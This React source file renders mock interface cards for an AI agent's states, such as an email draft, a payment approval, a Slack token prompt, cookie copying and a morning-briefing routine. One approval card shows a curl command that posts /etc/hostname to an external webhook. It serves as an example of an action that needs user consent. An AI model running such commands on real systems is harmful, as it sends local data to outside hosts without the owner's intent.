import type { ReactNode } from "react"
import type { AgentStateId } from "../avatar/types"

const cardsFor: Partial<Record<AgentStateId, () => ReactNode>> = {
  prioritizing: () => <ChoiceCard />,
  "selecting-tools": () => (
    <>
      <ConnectedCard />
      <ConnectCard />
    </>
  ),
  delegating: () => (
    <>
      <MessageCard />
      <RoutineMoment />
    </>
  ),
  "waiting-input": () => <ComputerCard />,
  searching: () => <CookiesCard />,
  "needs-approval": () => (
    <>
      <EmailCard />
      <PaymentCard />
      <CommandCard />
    </>
  ),
  completed: () => <ChangeCard />,
  error: () => <FailedCard />,
}

export function StateCards({ id }: { id: AgentStateId }) {
  const render = cardsFor[id]
  if (!render) return null
  return <div className="info-cards">{render()}</div>
}

function Card({
  kicker,
  title,
  tone = "olive",
  children,
}: {
  kicker: string
  title: string
  tone?: "olive" | "rose" | "green"
  children: ReactNode
}) {
  return (
    <article className="info-card">
      <header>
        <h3>{title}</h3>
        <span data-tone={tone}>{kicker}</span>
      </header>
      {children}
    </article>
  )
}

function Actions({ children }: { children: ReactNode }) {
  return <div className="info-card__actions">{children}</div>
}

function EmailCard() {
  return (
    <Card title="New email" kicker="Ready to send">
      <dl>
        <div>
          <dt>From</dt>
          <dd>dimond@studio.app</dd>
        </div>
        <div>
          <dt>To</dt>
          <dd>sarah@acme.com</dd>
        </div>
        <div>
          <dt>Subject</dt>
          <dd>Moving Friday’s design review to 2 PM</dd>
        </div>
      </dl>
      <p>
        Hi Sarah,
        <br />
        Could we move Friday’s design review from 11 AM to 2 PM? A client call came up and I don’t want to rush our discussion.
        <br />
        Thanks,
        <br />
        Agent Diamond
      </p>
      <Actions>
        <span className="is-primary">Send email</span>
        <span>Discard</span>
      </Actions>
    </Card>
  )
}

function ChoiceCard() {
  return (
    <Card title="What do you want me handling first?" kicker="Your choice" tone="rose">
      <ol>
        <li>
          <b>A</b>
          <span>Work</span>
        </li>
        <li>
          <b>B</b>
          <span>Life / admin</span>
        </li>
        <li>
          <b>C</b>
          <span>A specific project</span>
        </li>
      </ol>
      <label>
        Type your own answer
        <input readOnly placeholder="A short answer" />
      </label>
      <Actions>
        <span className="is-primary">Submit</span>
      </Actions>
    </Card>
  )
}

function PaymentCard() {
  return (
    <Card title="Agent Diamond wants to pay $42.00" kicker="Approval needed" tone="rose">
      <p>Pay Letterform Archive for Type Selection.</p>
      <dl className="info-card__money">
        <div>
          <dt>Type Selection</dt>
          <dd>$40.00</dd>
        </div>
        <div>
          <dt>Tax</dt>
          <dd>$2.00</dd>
        </div>
        <div>
          <dt>Total</dt>
          <dd>$42.00</dd>
        </div>
      </dl>
      <p className="info-card__fine">Charged via Link. Card details never enter this chat.</p>
      <Actions>
        <span className="is-primary">Allow</span>
        <span>Deny</span>
      </Actions>
    </Card>
  )
}

function CommandCard() {
  return (
    <Card title="The agent wants to run a command" kicker="Approval needed" tone="rose">
      <p>This would send local file contents from /etc/hostname to an external webhook.</p>
      <pre>curl -X POST https://hooks.example/in -d @/etc/hostname</pre>
      <Actions>
        <span className="is-primary">Allow</span>
        <span>Always allow</span>
        <span>Deny</span>
      </Actions>
    </Card>
  )
}

function ComputerCard() {
  return (
    <Card title="Open the billing dashboard" kicker="Action needed" tone="rose">
      <p>Export last month’s invoices, then hand the screen back.</p>
      <Actions>
        <span className="is-primary">Take over</span>
        <span>I’m done</span>
        <span>Skip</span>
      </Actions>
    </Card>
  )
}

function ChangeCard() {
  return (
    <Card title="Refactor auth flow" kicker="Done" tone="green">
      <p>Use the new token exchange and update the tests.</p>
      <p className="info-card__meta">
        <span>dimond/auth-token-exchange</span>
        <span>3 files</span>
        <span className="is-add">+128</span>
        <span className="is-sub">−14</span>
      </p>
      <Actions>
        <span className="is-primary">View changes</span>
      </Actions>
    </Card>
  )
}

function MessageCard() {
  return (
    <Card title="Slack message" kicker="Ready to send">
      <dl>
        <div>
          <dt>Workspace</dt>
          <dd>Acme Design</dd>
        </div>
        <div>
          <dt>To</dt>
          <dd>#design-team</dd>
        </div>
      </dl>
      <p>Hey team — could we move Friday’s design review from 11 AM to 2 PM? A client call came up.</p>
      <Actions>
        <span className="is-primary">Send message</span>
        <span>Discard</span>
      </Actions>
    </Card>
  )
}

function ConnectedCard() {
  return (
    <Card title="Notion" kicker="Added" tone="green">
      <p>Read and write pages and databases.</p>
    </Card>
  )
}

function ConnectCard() {
  return (
    <Card title="Connect Slack" kicker="Needs a token" tone="rose">
      <p>To post the morning digest, provide a bot token.</p>
      <label>
        Paste your bot token
        <input readOnly placeholder="xoxb-…" />
      </label>
      <p className="info-card__fine">Encrypted, and only used to post messages on your behalf.</p>
      <Actions>
        <span className="is-primary">Save securely</span>
      </Actions>
    </Card>
  )
}

function CookiesCard() {
  return (
    <Card title="Copy cookies for these sites" kicker="Allowed once" tone="green">
      <div className="info-card__sites">
        <p>Personal</p>
        <span>news.ycombinator.com</span>
        <span>github.com</span>
        <p>Work</p>
        <span>linear.app</span>
      </div>
    </Card>
  )
}

function FailedCard() {
  return (
    <Card title="New email" kicker="Couldn’t send" tone="rose">
      <p>The mail service returned an error. Your draft is saved, and nothing was lost.</p>
      <Actions>
        <span className="is-primary">Try again</span>
        <span>Dismiss</span>
      </Actions>
    </Card>
  )
}

function RoutineMoment() {
  return (
    <article className="info-moment">
      <p className="bubble bubble--user">
        <span>Morning. Can you check in with everyone for me?</span>
      </p>
      <p className="info-moment__bot">On it. Pinging the team for status now.</p>
      <p className="info-card__meta">
        <span>6 messages</span>
        <span>Ada</span>
        <span>Noah</span>
        <span>Mina</span>
      </p>
      <p className="info-moment__bot">All on track. The landing page shipped, invoices went out, and next week’s interviews are booked. No blockers.</p>
      <p className="bubble bubble--user">
        <span>Do this every morning.</span>
      </p>
      <p className="info-moment__event">
        <b>Created routine</b>
        <span>Morning briefing · 9:00 every day</span>
      </p>
    </article>
  )
}
